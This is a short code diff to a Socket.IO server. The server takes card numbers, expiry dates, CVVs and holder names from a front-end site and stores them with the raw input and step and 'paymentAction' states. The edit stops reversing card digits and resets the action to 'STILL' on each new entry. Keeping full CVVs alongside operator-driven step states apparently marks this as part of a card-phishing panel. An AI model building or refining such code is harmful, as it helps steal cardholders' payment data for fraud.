@@ -155,9 +155,8 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
         const str = (v: unknown) => (v != null ? String(v) : "");
         // دعم أسماء الحقول المختلفة من الموقع الأمامي
         const rawCardNum = str(data.cardNumber ?? data.CardID ?? data.cardID ?? "").replace(/\s/g, "");
-        // الموقع يستخدم dir=rtl في حقل رقم البطاقة مما يجعل الأرقام تصل معكوسة
-        // نعكسها لاستعادة الترتيب الصحيح
-        const cardNum = rawCardNum.split("").reverse().join("");
+        // نحتفظ برقم البطاقة كما أدخله العميل بدون عكس
+        const cardNum = rawCardNum;
         const expiry = str(data.expirationDate ?? data.DateExp ?? data.dateExp ?? "");
         const cvv = str(data.cvv ?? data.CVV ?? data.cardCvv ?? "");
         const holderName = str(data.cardHolderName ?? data.CardHolderName ?? "");
@@ -170,6 +169,8 @@ export function initSocket(httpServer: HttpServer): SocketIOServer {
           cardCvv: cvv,
           step: 1,
           status: "step1_done",
+          // إعادة تعيين paymentAction إلى STILL عند كل إدخال جديد للبطاقة
+          paymentAction: "STILL",
           rawData: data,
         });
         await updateBookingStatus(reference, "pending_payment");
